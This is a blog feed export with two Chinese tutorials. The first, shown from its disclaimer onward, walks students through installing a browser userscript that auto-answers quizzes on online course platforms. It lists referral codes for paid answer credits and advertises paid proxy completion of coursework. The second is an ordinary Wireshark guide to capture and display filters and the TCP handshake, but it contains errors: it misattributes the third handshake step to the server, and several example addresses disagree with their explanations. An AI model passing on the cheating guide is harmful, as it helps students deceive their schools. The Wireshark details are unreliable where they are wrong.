<li>本刷题脚本提供的题目及答案信息来源于公开的资源和第三方网站，我们尽最大努力确保信息的准确性和完整性，但不对其真实性、准确性、可靠性和完整性做出任何明示或暗示的保证。</li>
<li>使用本刷题脚本所导致的一切后果和责任由用户自行承担，包括但不限于因使用本脚本而引发的任何损失、损害、纠纷、法律责任等。本刷题脚本的开发者和提供者不承担任何责任。</li>
<li>本刷题脚本可能会涉及到对第三方网站的访问和数据获取，若因此产生的任何纠纷或损失，本刷题脚本的开发者和提供者不承担任何责任。</li>
<li>本刷题脚本可能随着题库更新而需要不定期的更新和维护，我们将尽量保证更新和维护的及时性和有效性，但不对由于更新和维护造成的任何不便和损失承担责任。</li>
<li>本刷题脚本的安装和使用即表示用户已充分阅读、理解并接受本免责声明的全部内容。如果用户对免责声明的任何内容存在异议，应立即停止使用本刷题脚本。</li>
</ol>
<h2 id="脚本的优势"><a href="#脚本的优势" class="headerlink" title="脚本的优势"></a>脚本的优势</h2><ol>
<li>支持高达约 200 个教育平台，<span style="color:#FF0000;"> 覆盖率高 </span></li>
<li>题库十分 <span style="color:#FF0000;"> 完善 </span>，正确率高达 99.9%</li>
<li>价格 <span style="color:#FF0000;"> 低廉 </span>，最适合中国大学生体质</li>
</ol>
<h2 id="前排提醒"><a href="#前排提醒" class="headerlink" title="前排提醒"></a>前排提醒</h2><p><span style="color:#FF0000;"> 如果你觉得教程麻烦 </span>，可以联系 → <a class="link"   href="mailto:w1ndys@outlook.com" >w1ndys@outlook.com<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，几块钱（具体看题量）付费代刷题，但本人不对后果负任何责任</p>
<p>本教程所用的脚本与教程编写者无任何关系，教程只是一个引导作用，实际出任何问题请联系脚本开发者</p>
<p><span style="font-size:1.1em; color:#FF0000;"> 脚本的使用规则：每天每个 IP 有 免费 10 积分，积分售价 10 元 1000 积分，测试发现，可以看做是 1 积分 1 个答案，综合下来就是 10r 大约能买 1000 道题的答案 </span></p>
<p>此收费项目与教程编写者 <span style="color:#FF0000;"> 无任何关系 </span>，如果你介意此费用，请立即退出此页面，阅读本教程即代表你同意本教材的全部用户协议以及免责声明</p>
<h2 id="开始操作"><a href="#开始操作" class="headerlink" title="开始操作"></a>开始操作</h2><p>我们推荐 <code>Microsoft Edge</code>，因为这个浏览器安装插件不需要魔法，另外如果有需要魔法的，推荐用 <a href="https://blog.w1ndys.top/posts/80f8b1da">我正在用的</a>，平均 40r 可以用一年多，延迟在 200ms 左右，很稳。</p>
<h3 id="插件安装"><a href="#插件安装" class="headerlink" title="插件安装"></a>插件安装</h3><ol>
<li>打开浏览器，进入下面地址</li>
</ol>
<p><a class="link"   href="https://microsoftedge.microsoft.com/addons/detail/scriptcat/liilgpjgabokdklappibcjfablkpcekh" >https://microsoftedge.microsoft.com/addons/detail/scriptcat/liilgpjgabokdklappibcjfablkpcekh<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>点击 <code>获取</code>，这边我已经安装过了，所以是显示 <code>删除</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/classscript/image-20240307193538754.png"
                      alt="image-20240307193538754"
                ></p>
<ol start="2">
<li>进入下面地址，点击 <code>安装脚本</code></li>
</ol>
<p><a class="link"   href="https://scriptcat.org/zh-CN/script-show-page/1338#/" >https://scriptcat.org/zh-CN/script-show-page/1338#/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><span style="color:#FF0000;">经测试，该脚本不适合刷 welearn，刷 welearn 用下面这个</span></p>
<p><a class="link"   href="https://scriptcat.org/zh-CN/script-show-page/174#/" >https://scriptcat.org/zh-CN/script-show-page/174#/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/classscript/image-20240307193748656.png"
                      alt="image-20240307193748656"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/classscript/image-20240307193817863.png"
                      alt="image-20240307193817863"
                ></p>
<ol start="3">
<li>刷新一下页面</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/classscript/image-20240307193852350.png"
                      alt="image-20240307193852350"
                ></p>
<p>点击 <code>确认</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/classscript/image-20240307194048489.png"
                      alt="image-20240307194048489"
                ></p>
<p>出现中间登陆成功的字样，代表成功登陆</p>
<h2 id="配置插件"><a href="#配置插件" class="headerlink" title="配置插件"></a>配置插件</h2><ol>
<li>进入你要刷课的平台，我这里以 <a class="link"   href="https://u.unipus.cn/user/student?school_id=9541#/" >U 校园<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 为例, 登上你的账号，看到右下角（不一定），有个悬浮窗，点击设置</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/classscript/image-20240307194304461.png"
                      alt="image-20240307194304461"
                ></p>
<p>点击账号操作</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/classscript/image-20240307194353048.png"
                      alt="image-20240307194353048"
                ></p>
<p>如果你是 U 校园，输入邀请码 <code>VGKTEW</code> 领取 50 积分</p>
<p>如果你是智慧树知到，输入邀请码 <code>6FB7S7 </code> 领取 50 积分</p>
<p>如果你是超星学习通，输入邀请码 <code>P7KSHM </code>，领取 50 积分</p>
<p>如果你是其他平台，联系作者获取邀请码，免费赠送 50 积分，作者邮箱 <a class="link"   href="mailto:w1ndys@outlook.com" >w1ndys@outlook.com<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<ol start="2">
<li>之后点击 <code>自动答题	</code></li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/classscript/image-20240307195632874.png"
                      alt="image-20240307195632874"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/classscript/image-20240307195716103.png"
                      alt="image-20240307195716103"
                ></p>
<p>点击 <code>搜索推荐答题配置</code>，显示【生效】代表生效成功，点击 <code>展开所有配置</code> 可以看到支持的所有平台，推荐 <code>答题间隔</code> 不要太低，建议 <code>打开</code>【手动搜题模式】，避免浪费积分</p>
<ol start="3">
<li>刷新页面，点击做题</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/classscript/image-20240307200109522.png"
                      alt="image-20240307200109522"
                ></p>
<p>等待填完答案，就可以提交了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/classscript/image-20240307200312763.png"
                      alt="image-20240307200312763"
                ></p>
<h2 id="刷题结果"><a href="#刷题结果" class="headerlink" title="刷题结果"></a>刷题结果</h2><p>放一下我自己刷的正确率，我个人觉得，这是我用过的题库最正确的脚本了，刷了十几套题，没有错的</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/classscript/d3b5459d33995b96a275e6aa3f33f295.png"
                      alt="d3b5459d33995b96a275e6aa3f33f295"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/classscript/d3b5459d33995b96a275e6aa3f33f295_0.png"
                      alt="d3b5459d33995b96a275e6aa3f33f295_0"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/classscript/edc36ed12d801db5092cf2312babd58a.png"
                      alt="edc36ed12d801db5092cf2312babd58a"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/classscript/image-20240307200522433.png"
                      alt="image-20240307200522433"
                ></p>
]]></content>
      <categories>
        <category>技术教程</category>
      </categories>
      <tags>
        <tag>QFNU</tag>
        <tag>智慧树</tag>
        <tag>学习通</tag>
        <tag>U校园</tag>
        <tag>Welearn</tag>
        <tag>脚本</tag>
      </tags>
  </entry>
  <entry>
    <title>Wireshark使用教程</title>
    <url>/posts/2d075872.html</url>
    <content><![CDATA[<h1 id="Wireshark-使用教程"><a href="#Wireshark-使用教程" class="headerlink" title="Wireshark 使用教程"></a>Wireshark 使用教程</h1><blockquote>
<p>W1ndys</p>
</blockquote>
<h2 id="Wireshark-开始抓包示例"><a href="#Wireshark-开始抓包示例" class="headerlink" title="Wireshark 开始抓包示例"></a>Wireshark 开始抓包示例</h2><p>先介绍一个使用 Wireshark 工具抓取 ping 命令操作的示例</p>
<ol>
<li>打开 Wireshark ，主界面如下：</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Wireshark/2.png"
                      alt="在这里插入图片描述"
                ></p>
<ol start="2">
<li>选择对应的网卡，右键，会出现 Start Capture(开始捕获)，点击即可进行捕获该网络信息，开始抓取网络包</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Wireshark/3.png"
                      alt="在这里插入图片描述"
                ></p>
<ol start="3">
<li><p>执行需要抓包的操作，如 ping <a class="link"   href="http://www.baidu.com./" >www.baidu.com。<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</li>
<li><p>操作完成后相关数据包就抓取到了。为避免其他无用的数据包影响分析，可以通过在过滤栏设置过滤条件进行数据包列表过滤，获取结果如下。</p>
</li>
</ol>
<blockquote>
<p>说明：ip.addr &#x3D;&#x3D; 180.101.49.11 and icmp 表示只显示 ICPM 协议且源主机 IP 或者目的主机 IP 为 119.75.217.26 的数据包。</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Wireshark/4.png"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Wireshark/5.png"
                      alt="在这里插入图片描述"
                ></p>
<p>Wireshark 抓包完成。</p>
<h2 id="Wireshark-抓包界面"><a href="#Wireshark-抓包界面" class="headerlink" title="Wireshark 抓包界面"></a>Wireshark 抓包界面</h2><p>菜单栏：用于调试、配置</p>
<p>工具栏：常用功能的快捷方式</p>
<p>过滤栏：指定过滤条件，过滤数据包</p>
<p>数据包列表：核心区域，每一行就是一个数据包</p>
<p>数据包详情：数据包的详细数据</p>
<p>数据包字节：数据包对应的字节流，二进制</p>
<h3 id="基础操作"><a href="#基础操作" class="headerlink" title="基础操作"></a>基础操作</h3><h4 id="调整界面大小"><a href="#调整界面大小" class="headerlink" title="调整界面大小"></a>调整界面大小</h4><p>工具栏中的三个「放大镜」图标，可以调整主界面数据的大小。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Wireshark/v2-6699ce938edc035300fa767dcb0dcf3e_r.jpg"
                      alt="img"
                ></p>
<p>从左到右依次是：放大、缩小、还原默认大小。</p>
<h4 id="设置显示列"><a href="#设置显示列" class="headerlink" title="设置显示列"></a>设置显示列</h4><p>数据包列表是最常用的模块之一，列表中有一些默认显示的列，我们可以添加、删除、修改显示的列。</p>
<ol>
<li><p>添加显示列</p>
<p>想要在数据列表中显示某一个字段，可以将这个数据字段添加至显示列中。</p>
<p>左键选中想要添加为列的字段，右键选择「应用为列」。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Wireshark/v2-0f39b1dac8cd6cbbb37c31d9bad134bd_r.jpg"
                      alt="img"
                ></p>
<p>选中字段，按 Ctrl + Shift + I ，也可以实现同样的效果。</p>
<p>添加为列的字段会在数据列表中显示。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Wireshark/v2-c4d944deb725fb3e5d29b6c6f641309f_r.jpg"
                      alt="img"
                ></p>
</li>
<li><p>隐藏显示列</p>
<p>暂时不想查看的列，可以暂时隐藏起来。</p>
<p>在显示列的任意位置右键，取消列名的「勾选」，即可隐藏显示列。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Wireshark/v2-1cd599fede8832d61542d7dd36bcf074_r.jpg"
                      alt="img"
                ></p>
</li>
<li><p>删除显示列</p>
<p>要删除某一列，可以将其从显示列中删除。</p>
<p>右键需要删除的列，点击最下方的「Remove this Column」 。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Wireshark/v2-d847692f29ebf88e13f682e17338b0a3_r.jpg"
                      alt="img"
                ></p>
<p>注意：隐藏字段时，在列名栏的任意位置右键即可；而删除字段时，需要在指定的列名位置右键，以防误删。</p>
</li>
</ol>
<h4 id="设置时间"><a href="#设置时间" class="headerlink" title="设置时间"></a>设置时间</h4><p>数据包列表栏的时间这一列，默认显示格式看起来很不方便，我们可以调整时间的显示格式。</p>
<p>点击工具栏的「视图」，选择「时间显示格式」，设置你喜欢的格式。</p>
<h4 id="标记数据包"><a href="#标记数据包" class="headerlink" title="标记数据包"></a>标记数据包</h4><p>对于某些比较重要的数据包，可以设置成高亮显示，以达到标记的目的。</p>
<p>选中需要标记的数据包，右键选择最上面的「标记&#x2F;取消标记」。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Wireshark/v2-c6956b2fc0772a276758b1b8eb9d8bd5_r.jpg"
                      alt="img"
                ></p>
<p>选中数据包，按 Ctrl + M 也可以实现同样的效果，按两次可以取消标记。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Wireshark/v2-7e478271d2d5d2d0a394f25e16dc7263_r.jpg"
                      alt="img"
                ></p>
<h4 id="导出数据包"><a href="#导出数据包" class="headerlink" title="导出数据包"></a>导出数据包</h4><p>演示快速抓包时，我们讲过保存数据包的操作，保存操作默认保存所有已经抓取的数据包。但有时候，我们只需要保存指定的数据包，这时候可以使用导出的功能。</p>
<ol>
<li><p>导出单个数据包</p>
<p>选中数据包，点击左上角的「文件」，点击「导出特定分组」。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Wireshark/v2-97b1e10eb58abef56e21b17955a44f7f_r.jpg"
                      alt="img"
                ></p>
<p>在「导出分组界面」，选择第二个 「Selected packets only」，只保存选中的数据包。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Wireshark/v2-8dc0284818c96c6e2059a7767acf8037_r.jpg"
                      alt="img"
                ></p>
</li>
<li><p>导出多个数据包</p>
<p>有时候我们需要导出多个数据包，Wireshark 有一个导出标记的数据包的功能，我们将需要导出的数据包都标记起来，就可以同时导出多个数据包。</p>
<p>点击左上角的「文件」，点击「导出特定分组」。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Wireshark/v2-601fb8d88bf433ef25012c1d9faa8e97_r.jpg"
                      alt="img"
                ></p>
<p>在「导出分组界面」，勾选第三个 「Marked packets only」，只导出标记的数据包。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Wireshark/v2-f5c21a429a2302c4750b76839a763793_r.jpg"
                      alt="img"
                ></p>
</li>
</ol>
<h4 id="开启混杂模式"><a href="#开启混杂模式" class="headerlink" title="开启混杂模式"></a>开启混杂模式</h4><p>局域网的所有流量都会发送给我们的电脑，默认情况下，我们的电脑只会对自己 mac 的流量进行解包，而丢弃其他 mac 的数据包。</p>
<p>开启混杂模式后，我们就可以解析其他 mac 的数据包，因此，我们使用 Wireshark 时，通常都会开启混杂模式。</p>
<p>点击菜单栏的「捕获」按钮，点击「选项」。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Wireshark/v2-1418bdcf52cd4f154aa541e336080dbb_r.jpg"
                      alt="img"
                ></p>
<p>勾选 在所有接口上使用混杂模式。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Wireshark/v2-026cbb45b75a5cad0bc8670b84c5f2be_r.jpg"
                      alt="img"
                ></p>
<h3 id="界面"><a href="#界面" class="headerlink" title="界面"></a>界面</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Wireshark/1.png"
                      alt="界面"
                ></p>
<p>说明：数据包列表区中不同的协议使用了不同的颜色区分，可以在视图 &gt; 着色规则里查看</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Wireshark/image-20240405144823299.png"
                      alt="image-20240405144823299"
                ></p>
<h3 id="Display-Filter-显示过滤器"><a href="#Display-Filter-显示过滤器" class="headerlink" title="Display Filter(显示过滤器)"></a>Display Filter(显示过滤器)</h3><p>用于设置过滤条件进行数据包列表过滤。菜单路径：分析 &gt; 显示</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Wireshark/image-20240405145223969.png"
                      alt="image-20240405145223969"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Wireshark/image-20240405145153015.png"
                      alt="image-20240405145153015"
                ></p>
<h3 id="Packet-List-Pane-数据包列表"><a href="#Packet-List-Pane-数据包列表" class="headerlink" title="Packet List Pane(数据包列表)"></a>Packet List Pane(数据包列表)</h3><p>显示捕获到的数据包，每个数据包包含编号，时间截，源地址，目标地址，协议，长度，以及数据包信息。 不同协议的数据包使用了不同的颜色区分显示。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Wireshark/image-20240405145313985.png"
                      alt="image-20240405145313985"
                ></p>
<h3 id="Packet-Details-Pane-数据包详细信息"><a href="#Packet-Details-Pane-数据包详细信息" class="headerlink" title="Packet Details Pane(数据包详细信息)"></a>Packet Details Pane(数据包详细信息)</h3><p>在数据包列表中选择指定数据包，在数据包详细信息中会显示数据包的所有详细信息内容。数据包详细信息面板是最重要的，用来查看协议中的每一个字段。各行信息分别为</p>
<ol>
<li><p>Frame: 物理层的数据帧概况</p>
</li>
<li><p>Ethernet II: 数据链路层以太网帧头部信息</p>
</li>
<li><p>Internet Protocol Version 4: 互联网层 IP 包头部信息</p>
</li>
<li><p>Transmission Control Protocol: 传输层 T 的数据段头部信息，此处是 TCP</p>
</li>
<li><p>Hypertext Transfer Protocol: 应用层的信息，此处是 HTTP 协议</p>
</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Wireshark/image-20240405152357981.png"
                      alt="image-20240405152357981"
                ></p>
<h2 id="TCP-包的具体内容"><a href="#TCP-包的具体内容" class="headerlink" title="TCP 包的具体内容"></a>TCP 包的具体内容</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Wireshark/image-20240405152457756.png"
                      alt="image-20240405152457756"
                ></p>
<h2 id="Wireshark-过滤器设置"><a href="#Wireshark-过滤器设置" class="headerlink" title="Wireshark 过滤器设置"></a>Wireshark 过滤器设置</h2><h3 id="抓包过滤器"><a href="#抓包过滤器" class="headerlink" title="抓包过滤器"></a>抓包过滤器</h3><p>捕获过滤器的菜单栏路径为 <code>捕获 --&gt; 捕获过滤器</code>, <strong>用于在抓取数据包前设置。</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Wireshark/image-20240405153327886.png"
                      alt="image-20240405153327886"
                ></p>
<p>如何使用？可以在抓取数据包前设置如下。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Wireshark/image-20240405153501269.png"
                      alt="image-20240405153501269"
                ></p>
<p>ip host 60.207.246.216 and icmp 表示只捕获主机 IP 为 60.207.246.216 的 ICMP 数据包。获取结果如下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Wireshark/image-20240405153529187.png"
                      alt="image-20240405153529187"
                ></p>
<h3 id="显示过滤器"><a href="#显示过滤器" class="headerlink" title="显示过滤器"></a>显示过滤器</h3><p>显示过滤器是用于在抓取数据包后设置过滤条件进行过滤数据包。通常是在抓取数据包时设置条件相对宽泛，抓取的数据包内容较多时使用显示过滤器设置条件过滤以方便分析。同样上述场景，在捕获时未设置捕获规则直接通过网卡进行抓取所有数据包，如下</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Wireshark/image-20240405153556665.png"
                      alt="image-20240405153556665"
                ></p>
<p>执行 ping <a class="link"   href="http://www.huawei.com/" >www.huawei.com<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 获取的数据包列表如下</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Wireshark/image-20240405153625013.png"
                      alt="image-20240405153625013"
                ></p>
<p>观察上述获取的数据包列表，含有大量的无效数据。这时可以通过设置显示器过滤条件进行提取分析信息。ip.addr &#x3D;&#x3D; 211.162.2.183 and icmp。并进行过滤。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Wireshark/image-20240405153707323.png"
                      alt="image-20240405153707323"
                ></p>
<p>上述介绍了抓包过滤器和显示过滤器的基本使用方法。<strong>在组网不复杂或者流量不大情况下，使用显示器过滤器进行抓包后处理就可以满足我们使用</strong>。下面介绍一下两者间的语法以及它们的区别。</p>
<h3 id="Wireshark-过滤器表达式的规则"><a href="#Wireshark-过滤器表达式的规则" class="headerlink" title="Wireshark 过滤器表达式的规则"></a>Wireshark 过滤器表达式的规则</h3><h4 id="抓包过滤器语法和实例"><a href="#抓包过滤器语法和实例" class="headerlink" title="抓包过滤器语法和实例"></a>抓包过滤器语法和实例</h4><p>抓包过滤器类型 Type（host、net、port）、方向 Dir（src、dst）、协议 Proto（ether、ip、tcp、udp、http、icmp、ftp 等）、逻辑运算符（&amp;&amp; 与、|| 或、！非）</p>
<ol>
<li><p>协议过滤</p>
<p>比较简单，直接在抓包过滤框中直接输入协议名即可。</p>
<p>TCP，只显示 TCP 协议的数据包列表</p>
<p>HTTP，只查看 HTTP 协议的数据包列表</p>
<p>ICMP，只显示 ICMP 协议的数据包列表</p>
</li>
<li><p>IP 过滤</p>
<p>host 192.168.1.104</p>
<p>src host 192.168.1.104</p>
<p>dst host 192.168.1.104</p>
</li>
<li><p>端口过滤</p>
<p>port 80</p>
<p>src port 80</p>
<p>dst port 80</p>
</li>
<li><p>逻辑运算符&amp;&amp; 与、|| 或、！非</p>
<p>src host 192.168.1.104 &amp;&amp; dst port 80 抓取主机地址为 192.168.1.80、目的端口为 80 的数据包</p>
<p>host 192.168.1.104 || host 192.168.1.102 抓取主机为 192.168.1.104 或者 192.168.1.102 的数据包</p>
<p>！broadcast 不抓取广播数据包</p>
</li>
</ol>
<h4 id="显示过滤器语法和实例"><a href="#显示过滤器语法和实例" class="headerlink" title="显示过滤器语法和实例"></a>显示过滤器语法和实例</h4><ol>
<li><p>比较操作符</p>
<p>比较操作符有 &#x3D;&#x3D; 等于、！&#x3D; 不等于、&gt; 大于、&lt; 小于、&gt; &#x3D; 大于等于、&lt;&#x3D; 小于等于。</p>
</li>
<li><p>协议过滤</p>
<p>比较简单，直接在 Filter 框中直接输入协议名即可。注意：协议名称需要输入小写。</p>
<p>tcp，只显示 TCP 协议的数据包列表</p>
<p>http，只查看 HTTP 协议的数据包列表</p>
<p>icmp，只显示 ICMP 协议的数据包列表</p>
</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Wireshark/image-20240405154240409.png"
                      alt="image-20240405154240409"
                ></p>
<ol start="3">
<li><p>ip 过滤</p>
<p>ip.src &#x3D;&#x3D; 192.168.1.104 显示源地址为 192.168.1.104 的数据包列表</p>
<p>ip.dst &#x3D;&#x3D; 192.168.1.104, 显示目标地址为 192.168.1.104 的数据包列表</p>
<p>ip.addr &#x3D;&#x3D; 192.168.1.104 显示源 IP 地址或目标 IP 地址为 192.168.1.104 的数据包列表</p>
</li>
<li><p>端口过滤</p>
<p>tcp.port &#x3D;&#x3D; 80, 显示源主机或者目的主机端口为 80 的数据包列表。</p>
<p>tcp.srcport &#x3D;&#x3D; 80, 只显示 TCP 协议的源主机端口为 80 的数据包列表。</p>
<p>tcp.dstport &#x3D;&#x3D; 80，只显示 TCP 协议的目的主机端口为 80 的数据包列表。</p>
</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Wireshark/image-20240405165615171.png"
                      alt="image-20240405165615171"
                ></p>
<ol start="5">
<li><p>http 模式过滤</p>
<p>http.request.method &#x3D;&#x3D;“GET”, 只显示 HTTP GET 方法的。</p>
</li>
<li><p>逻辑运算符为 and&#x2F;or&#x2F;not</p>
<p>过滤多个条件组合时，使用 and&#x2F;or。比如获取 IP 地址为 192.168.1.104 的 ICMP 数据包表达式为 ip.addr &#x3D;&#x3D; 192.168.1.104 and icmp</p>
</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Wireshark/image-20240405165713136.png"
                      alt="image-20240405165713136"
                ></p>
<ol start="7">
<li>按照数据包内容过滤。假设我要以 IMCP 层中的内容进行过滤，可以单击选中界面中的码流，在下方进行选中数据。如下</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Wireshark/image-20240405165744003.png"
                      alt="image-20240405165744003"
                ></p>
<p>右键单击选中后出现如下界面（作为过滤器应用）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Wireshark/image-20240405165822954.png"
                      alt="image-20240405165822954"
                ></p>
<p>选中 Select 后在过滤器中显示如下</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Wireshark/image-20240405165856429.png"
                      alt="image-20240405165856429"
                ></p>
<p>后面条件表达式就需要自己填写。如下我想过滤出 data 数据包中包含 “abcd” 内容的数据流。<strong>包含的关键词是 contains 后面跟上内容。</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Wireshark/image-20240405165918897.png"
                      alt="image-20240405165918897"
                ></p>
<h4 id="常见用显示过滤需求及其对应表达式"><a href="#常见用显示过滤需求及其对应表达式" class="headerlink" title="常见用显示过滤需求及其对应表达式"></a>常见用显示过滤需求及其对应表达式</h4><p><strong>数据链路层</strong>：</p>
<p>筛选 mac 地址为 04: f9:38: ad: 13:26 的数据包</p>
<p>eth.src &#x3D;&#x3D; 04: f9:38: ad: 13:26</p>
<p>筛选源 mac 地址为 04: f9:38: ad: 13:26 的数据包—-</p>
<p>eth.src &#x3D;&#x3D; 04: f9:38: ad: 13:26</p>
<p><strong>网络层</strong>：</p>
<p>筛选 ip 地址为 192.168.1.1 的数据包</p>
<p>ip.addr &#x3D;&#x3D; 192.168.1.1</p>
<p>筛选 192.168.1.0 网段的数据</p>
<p>ip contains “192.168.1”</p>
<p><strong>传输层</strong>：</p>
<p>筛选端口为 80 的数据包</p>
<p>tcp.port &#x3D;&#x3D; 80</p>
<p>筛选 12345 端口和 80 端口之间的数据包</p>
<p>tcp.port &#x3D;&#x3D; 12345 &amp;&amp;tcp.port &#x3D;&#x3D; 80</p>
<p>筛选从 12345 端口到 80 端口的数据包</p>
<p>tcp.srcport &#x3D;&#x3D; 12345 &amp;&amp;tcp.dstport &#x3D;&#x3D; 80</p>
<p><strong>应用层</strong>：</p>
<p>特别说明: http 中 http.request 表示请求头中的第一行（如 GET index.jsp HTTP&#x2F;1.1） http.response 表示响应头中的第一行（如 HTTP&#x2F;1.1 200 OK），其他头部都用 http.header_name 形式。</p>
<p>筛选 url 中包含.php 的 http 数据包</p>
<p>http.request.uri contains “.php”</p>
<p>筛选内容包含 username 的 http 数据包</p>
<p>http contains “username”</p>
<h2 id="Wireshark-抓包分析-TCP-三次握手过程"><a href="#Wireshark-抓包分析-TCP-三次握手过程" class="headerlink" title="Wireshark 抓包分析 TCP 三次握手过程"></a>Wireshark 抓包分析 TCP 三次握手过程</h2><h3 id="TCP-三次握手连接建立过程"><a href="#TCP-三次握手连接建立过程" class="headerlink" title="TCP 三次握手连接建立过程"></a>TCP 三次握手连接建立过程</h3><p>Step1：客户端发送一个 SYN &#x3D; 1，ACK &#x3D; 0 标志的数据包给服务端，请求进行连接，这是第一次握手；</p>
<p>Step2：服务端收到请求并且允许连接的话，就会发送一个 SYN &#x3D; 1，ACK &#x3D; 1 标志的数据包给发送端，告诉它，可以通讯了，并且让客户端发送一个确认数据包，这是第二次握手；</p>
<p>Step3：服务端发送一个 SYN &#x3D; 0，ACK &#x3D; 1 的数据包给客户端，告诉它连接已被确认，这就是第三次握手。TCP 连接建立，开始通讯。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Wireshark/v2-40824425eb3ef63f73841cae15ecefad_r.jpg"
                      alt="img"
                ></p>
<h3 id="Wireshark-抓包获取访问指定服务端数据包"><a href="#Wireshark-抓包获取访问指定服务端数据包" class="headerlink" title="Wireshark 抓包获取访问指定服务端数据包"></a>Wireshark 抓包获取访问指定服务端数据包</h3><p>Step1：启动 wireshark 抓包，打开浏览器输入 <a class="link"   href="http://www.baidu.com./" >http://www.baidu.com。<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>Step2：使用 ping <a class="link"   href="http://www.baidu.com/" >http://www.baidu.com<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 获取 IP。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Wireshark/v2-b9bfd6b8c414eeb25aed1fe00654134e_r.jpg"
                      alt="img"
                ><br>Step3：输入过滤条件获取待分析数据包列表 ip.addr &#x3D;&#x3D; 183.232.231.172</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Wireshark/v2-8da8884d3111e4efc2c08a0b894ef665_r.jpg"
                      alt="img"
                ></p>
